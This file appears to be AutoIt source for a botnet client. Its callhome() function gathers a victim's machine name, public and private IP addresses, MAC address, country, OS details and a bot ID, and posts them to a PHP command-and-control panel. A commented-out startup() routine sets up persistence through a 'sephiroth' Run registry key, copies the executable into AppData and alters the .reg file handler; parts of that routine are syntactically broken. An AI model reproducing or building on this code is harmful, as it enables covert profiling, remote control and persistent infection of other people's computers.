#include <WinHttp.au3>
#include <IE.au3>
#include <Inet.au3>
#include "_users.au3"


Func callhome()

	$data = "add=ok&nom_machine=" & $sComputerName & "&ip_public=" & _GetPublicIP() & "&ip_prive=" & _GetPrivateIP() & "&mac_adresse=" & $sMAC & "&pays=" & $sLocalisation & "&systeme_version=" & $sOSID & "&systeme_arch=" & $sOSac & "&id_bot=" & $sBotID & @CRLF
	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST", "http://localhost/AdminConnectX/index.php", False)
	$oHTTP.SetRequestHeader("User-Agent", "agent")
	$oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	$oHTTP.Send($data)
	$oReceived = $oHTTP.ResponseText
	;ConsoleWrite($oReceived)

EndFunc



#comments-start
Func startup()

    RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "sephiroth")

    If @error Then
	   RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "sephiroth", "REG_SZ", @AppDataDir & "\sephiroth.exe

	   ; Envoie les donnée au C&C php
	   callhome()

	   FileCopy(@ScriptFullPath, @AppDataDir & "\sephiroth.exe", 1)

	   $Open_Regedit = RegRead("HKEY_CLASSES_ROOT\regfile\shell\open\command", "(Default)")

    If $Open_Regedit <> 'regedit.exe' Then
	   RegWrite("HKEY_CLASSES_ROOT\regfile\shell\open\command", "(Default)", "REG_SZ", "regedit.exe")

EndFunc
#comments-end

